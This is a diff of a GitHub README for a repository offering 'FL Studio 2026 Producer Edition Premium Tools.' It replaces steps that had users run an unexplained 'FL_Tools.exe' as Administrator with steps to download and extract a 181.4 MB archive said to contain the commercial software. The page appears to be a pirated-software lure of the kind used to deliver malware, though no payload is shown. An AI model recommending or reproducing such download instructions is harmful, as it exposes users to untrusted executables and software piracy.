@@ -1,7 +1,3 @@
-<p align="center">
-  <img src="https://raw.githubusercontent.com/MapChronomancer/FL-Studio-2026-Producer-Edition-Premium-Tools/main/assets/logo.png" width="120">
-</p>
-
 <h1 align="center">🎹 FL Studio 2026 Producer Edition Premium Tools</h1>
 
 <p align="center">
@@ -15,8 +11,6 @@
   <a href="https://github.com/MapChronomancer/FL-Studio-2026-Producer-Edition-Premium-Tools"><img src="https://img.shields.io/github/license/MapChronomancer/FL-Studio-2026-Producer-Edition-Premium-Tools?style=flat-square&label=License&color=lightgrey"></a>
   <br>
   <img src="https://img.shields.io/badge/Platform-Windows%2010%2F11-blue?style=flat-square">
-  <img src="https://img.shields.io/badge/Version-v24.0-orange?style=flat-square">
-  <img src="https://img.shields.io/badge/Size-8.2%20MB-lightgrey?style=flat-square">
   <img src="https://img.shields.io/badge/Updated-October%202026-informational?style=flat-square">
 </p>
 
@@ -43,26 +37,18 @@
 
 ## 📥 Installation
 
-```bash
-# Download latest release
-https://github.com/MapChronomancer/FL-Studio-2026-Producer-Edition-Premium-Tools/releases/latest
+1. Open the [latest release](https://github.com/MapChronomancer/FL-Studio-2026-Producer-Edition-Premium-Tools/releases/latest).
+2. Download the published archive **`flstudio_win64_26.1.7.5653.rar`** (181.4 MB).
+3. Extract the archive with a compatible archive tool. Installation notes are available in the repository documentation and release notes.
 
-# Extract archive
-Right-click FL_Studio_Premium_Tools.zip → Extract to Desktop
-
-# Run
-Right-click FL_Tools.exe → Run as Administrator
-
-# Choose sync folder
-Point to your FL Studio Data folder
+The repository release tag and the version of software inside the archive are different identifiers. Check the release notes and package documentation for requirements and supported versions.
 
 ## ❓ FAQ
 
-**Q: Will it run on Windows 11 23H2?**
+**Where is the current download?**
 
-A: Yes — tested on the current 23H2 build, no extra steps required.
+Use the latest release link above; asset names and sizes are listed on GitHub.
 
-**Q: Does it work with multi-monitor setups?**
+**Where can I find documentation or ask a question?**
 
-A: Multi-monitor is supported; the overlay snaps to the foreground window's monitor automatically.
-<!-- doc tweak -->
+Browse the `docs` directory and use the repository Issues page for project questions.
